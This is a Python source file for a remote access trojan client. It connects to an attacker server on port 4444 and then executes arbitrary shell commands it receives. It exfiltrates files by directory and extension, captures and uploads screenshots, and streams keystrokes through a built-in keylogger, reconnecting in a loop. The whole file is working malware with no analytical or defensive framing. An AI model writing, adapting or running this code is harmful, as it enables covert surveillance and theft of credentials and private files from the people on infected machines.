import socket
import subprocess
import pyautogui
import keyboard
import random
import os

SERVER = "XXXXXXXXXXXXXXXXX"
PORT = 4444

def send_keystrokes(s, on):
    def on_key_event(event):
        key = event.name
        s.sendall(key.encode())

    if on:
        keyboard.on_press(on_key_event)
    else:
        keyboard.unhook_all()

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((SERVER, PORT))
    msg = s.recv(1024).decode()
    on = False

    while True:
        cmd = s.recv(1024).decode()

        if cmd.lower() in ['q', 'quit', 'x', 'exit']:
            break

        if cmd.lower().startswith('getdir'):
            _, directory, f_extension = cmd.split()
            try:
                for file_name in os.listdir(directory):
                    if file_name.endswith(f_extension):
                        with open(os.path.join(directory, file_name), 'rb') as f:
                            while chunk := f.read(1024):
                                s.sendall(chunk)
                s.sendall(b'')
            except Exception as e:
                s.send(str(e).encode())
            continue

        if cmd.lower() == 'scrs':
            screenshot = pyautogui.screenshot()
            screenshot_file = f"client_screenshot_{random.randint(1, 10000000)}.png"
            screenshot.save(screenshot_file)
            with open(screenshot_file, "rb") as scr_f:
                while chunk := scr_f.read(1024):
                    s.sendall(chunk)
            os.remove(screenshot_file)
            s.sendall(b'')
            continue

        if cmd.lower() == 'keylogger':
            on = True
            send_keystrokes(s, on)
            while on:
                if s.recv(1024).decode() == 'stop':
                    on = False
                    send_keystrokes(s, on)
                    break
            continue

        try:
            result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
        except Exception as e:
            result = str(e).encode()

        if len(result) == 0:
            result = '[+] Executed'.encode()

        s.send(result)

    s.close()

if __name__ == "__main__":
    while True:
        try:
            main()
        except Exception as e:

            main()
